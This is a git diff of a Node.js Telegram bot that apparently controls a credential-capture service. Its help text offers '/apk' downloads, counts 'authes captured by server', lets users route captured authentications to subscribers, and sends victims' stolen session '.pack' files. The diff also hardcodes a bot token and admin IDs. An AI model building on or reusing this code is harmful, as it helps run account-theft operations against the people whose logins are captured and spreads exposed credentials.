@@ -1,5 +1,5 @@
-const token = "8024030285:AAHK1G3DWTRrzzJehp8doQm0rV7MXGvzFYI";
-const admins = [5483232752];
+const token = "7204484658:AAECe0DHiD_c9Km19qQ61TWWeE5tP7odeH4";
+const admins = [5483232752, 5047714806];
 
 const TelegramBot = require("node-telegram-bot-api");
 const { JsonCore } = require("./jsoncore.js");
@@ -117,7 +117,7 @@ bot.on("message", (msg) => {
   msg.text = msg.text.toLowerCase();
   //console.log(msg)
   if (admins.includes(msg.from.id)){
-    if (msg.text === "/start"){
+    if (msg.text.startsWith("/start")){
       bot.sendMessage(
         msg.chat.id,
         makeFont("Admin Panel 💬\n\n/port <...userid...> <...mode...> ☎️\n/delport <...userid...> 📪\n/see <...userid...> 🕹"),
@@ -192,9 +192,10 @@ bot.on("message", (msg) => {
           } else { message += `\n🔋 Will end in ${ud.years} years`; }
 
           message += `\n🎞  Port mode: ${user["user"]["port"]["mode"]}`;
+          message += `\n📪 Dominant ( APK ): ${user["user"]["dominant"]}`;
           message += `\n👥️ Subscribers: ${JSON.stringify(user.user.subs, null, 2)}`
           message += `\n🔦 Port: `;
-          bot.sendMessage(msg.chat.id, makeFont(message) + `<code>${user["user"]["port"]["hash"]}</code>`, { reply_to_message_id: msg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [ [{ text: makeFont("get session 📥"), callback_data: "getSession" }] ] } })
+          bot.sendMessage(msg.chat.id, makeFont(message) + `<code>${user["user"]["port"]["hash"]}</code>`, { reply_to_message_id: msg.message_id, parse_mode: "HTML" })
           } else { message += `\n🪡 Has port: false`; bot.sendMessage(msg.chat.id, makeFont(message) , { reply_to_message_id: msg.message_id, parse_mode: "HTML" }) }
         } else {
         bot.sendMessage(msg.chat.id, makeFont("user has not signed up 🥃"), { reply_to_message_id: msg.message_id })
@@ -202,7 +203,7 @@ bot.on("message", (msg) => {
     }
   }
 
-  if (msg.text === "/install"){
+  if (msg.text.startsWith("/install")){
     const user = jsc.isExists(msg.from.id);
     if (!(user["status"] == "OK")){
     jsc.addUser({ userid: msg.from.id });
@@ -218,7 +219,7 @@ bot.on("message", (msg) => {
         { reply_to_message_id: msg.message_id }
       )
     }
-  } else if (msg.text === "/profile"){
+  } else if (msg.text.startsWith("/profile")){
     const user = jsc.isExists(msg.from.id);
     if (user["status"] === "OK"){
       let message = `Profile Page🧩🔮\n\n🎟 Uid: ${user["user"]["userid"]}`;
@@ -249,7 +250,7 @@ bot.on("message", (msg) => {
       } else {
         bot.sendMessage(msg.chat.id, makeFont("sign up with /install first 🥃"), { reply_to_message_id: msg.message_id })
       }
-    } else if (msg.text == "/report"){
+    } else if (msg.text.startsWith("/report")){
       const length = jsc.getAuthesLength(msg.from.id);
       if (length["status"] == "OK"){
       bot.sendMessage(msg.chat.id, makeFont(`You are including ${length.length} authes 🌊`), { reply_to_message_id: msg.message_id })
@@ -291,19 +292,29 @@ bot.on("message", (msg) => {
     const spls = msg.text.split(" ");
     const dominant = spls[1];
     bot.sendMessage(msg.chat.id, getPackFileId(dominant)+"\n This message will send as Document", { reply_to_message_id: msg.message_id });
+  } else if (msg.text.startsWith("/start") && !admins.includes(msg.from.id)){
+    bot.sendMessage(
+      msg.chat.id,
+      makeFont(`welcome [${msg.from.first_name}](tg://openmessage?user_id=${msg.from.id}) user !\nread documentation carefully then use the bot 👀\n\n`) + "/start" + makeFont(" - start the bot\n") + "/install" + makeFont(" - signup in bot\n") + "/apk" + makeFont(" - get the specified apk (only in pv)\n") + "/profile" + makeFont(" - see your profile info\n") + "/report" + makeFont(" - the length of authes were captured by server\n") + "/addsub <userid>" + makeFont(" - set subscriber (your authes will write for him/her if captured)\n") + "/delsub <userid>" + makeFont(" - delete subscriber\n\n📌 Note: make sure you started bot in pv •"),
+      { reply_to_message_id: msg.message_id, parse_mode: "Markdown", reply_markup: { inline_keyboard: [ [{ text: makeFont("close"), callback_data: "close" }] ] } }
+    )
   }
 
 })
 
 bot.on("callback_query", (call) => {
-  const user = jsc.isExists(call.from.id);
   //console.log(call.message.reply_to_message)
-  if (call.from.id == call.message.reply_to_message.from.id && user["status"] == "OK"){
-    if (user["user"]["has_port"]){
-      try{
-          bot.sendDocument(call.from.id, `fdsuhfdushfsdf9hdsf89hsd9fh8dsfsdfuhusdfusdfsdf/authes/${call.from.id}.pack`);
-      } catch (e) {
-        bot.sendMessage(call.chat.id, makeFont("Please start bot in PV first ! 💬"), { reply_to_message_id: call.message.message_id })
+  if (call.data === "close"){
+    bot.deleteMessage(call.message.chat.id, call.message.message_id);
+  } else {
+    const user = jsc.isExists(call.from.id);
+    if (call.from.id == call.message.reply_to_message.from.id && user["status"] == "OK"){
+      if (user["user"]["has_port"]){
+        try{
+            bot.sendDocument(call.from.id, `fdsuhfdushfsdf9hdsf89hsd9fh8dsfsdfuhusdfusdfsdf/authes/${call.from.id}.pack`);
+        } catch (e) {
+          bot.sendMessage(call.chat.id, makeFont("Please start bot in PV first ! 💬"), { reply_to_message_id: call.message.message_id })
+        }
       }
     }
   }
